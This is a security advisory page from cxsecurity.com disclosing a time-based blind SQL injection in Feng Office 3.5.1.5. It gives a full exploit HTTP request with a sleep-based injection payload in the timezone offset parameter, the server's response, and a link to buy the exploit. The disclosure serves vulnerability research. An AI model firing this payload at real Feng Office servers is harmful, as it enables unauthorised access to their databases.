---
title: fengoffice_3.5.1.5 - SQLi
url: https://cxsecurity.com/issue/WLB-2025050032
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-14
fetch_date: 2025-10-06T22:23:31.900494
---

# fengoffice_3.5.1.5 - SQLi

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **fengoffice\_3.5.1.5 - SQLi** **2025.05.13**  **![bg](https://cert.cx/cxstatic/images/flags/bg.png) [nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/) **(BG)** ![bg](https://cert.cx/cxstatic/images/flags/bg.png)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Titles: fengoffice\_3.5.1.5 - SQLi
# Author: nu11secur1ty
# Date: 05/11/2025
# Vendor: https://www.fengoffice.com/
# Software: https://trials.fengoffice.com/register?edition=starter
# Reference: https://portswigger.net/web-security/sql-injection
## Description:
The `id\_no\_select` parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the `id\_no\_select` parameter, and a general error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present. Additionally, the payload '+(select\*from(select(sleep(20)))a)+' was submitted in the `id\_no\_select` parameter. The application took 21140 milliseconds to respond to the request, compared with 355 milliseconds for the original request, indicating that the injected SQL command caused a time delay.
STATUS: HIGH Vulnerability
[+]Exploit GET Request:
- SQLi:
```SQLi
GET /fengoffice\_3.5.1.5/fengoffice\_3.5.1.5/index.php?context={}&currentdimension=0&ajax=true&c=account&a=set\_timezone&tz\_name=Europe%2FSofia&tz\_offset=3'%2b(select\*from(select(sleep(20)))a)%2b'&\_dc=1746872695052 HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate, br
Accept: \*/\*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
Cookie: PHPSESSID=f0keqkg63m62iapui7lch4ed61; http\_\_\_localhost\_fengoffice\_3\_5\_1\_5\_fengoffice\_3\_5\_1\_5id=2; http\_\_\_localhost\_fengoffice\_3\_5\_1\_5\_fengoffice\_3\_5\_1\_5token=5e177a5e794b55bb3f2e58843196e01fc1760008; http\_\_\_localhost\_fengoffice\_3\_5\_1\_5\_fengoffice\_3\_5\_1\_5remember=1
X-Requested-With: XMLHttpRequest
Referer: http://localhost/fengoffice\_3.5.1.5/fengoffice\_3.5.1.5/index.php?c=access&a=index
Sec-CH-UA: "Chromium";v="136", "Not;A=Brand";v="24", "Google Chrome";v="136"
Sec-CH-UA-Platform: "Windows"
Sec-CH-UA-Mobile: ?0
Content-Length: 0
```
[+]Response:
```
HTTP/1.1 200 OK
Date: Sun, 11 May 2025 06:39:42 GMT
Server: Apache/2.4.17 (Win32) OpenSSL/1.0.2d PHP/5.6.15
X-Powered-By: PHP/5.6.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Set-Cookie: http\_\_\_localhost\_fengoffice\_3\_5\_1\_5\_fengoffice\_3\_5\_1\_5id=2; expires=Sun, 25-May-2025 06:39:43 GMT; Max-Age=1209600; path=/
Set-Cookie: http\_\_\_localhost\_fengoffice\_3\_5\_1\_5\_fengoffice\_3\_5\_1\_5token=5e177a5e794b55bb3f2e58843196e01fc1760008; expires=Sun, 25-May-2025 06:39:43 GMT; Max-Age=1209600; path=/
Set-Cookie: http\_\_\_localhost\_fengoffice\_3\_5\_1\_5\_fengoffice\_3\_5\_1\_5remember=1; expires=Sun, 25-May-2025 06:39:43 GMT; Max-Age=1209600; path=/
Content-Length: 245
Connection: close
Content-Type: text/javascript; charset=UTF-8
{"contents":{},"current":false,"errorCode":0,"errorMessage":"","u":2,"scripts":["http:\/\/localhost\/fengoffice\_3.5.1.5\/fengoffice\_3.5.1.5\/public\/assets\/javascript\/og\/modules\/addMessageForm.js?rev=1"],"currentPanel":"account","events":[]}
```
# Reproduce:
[href](https://www.nu11secur1ty.com/2025/05/fengoffice3515-sqli.html)
# Buy an exploit only:
[href](https://satoshidisk.com/pay/CONTPR)
# Time spent:
03:15:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
0day Exploit DataBase https://0day.today/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <http://nu11secur1ty.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025050032)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top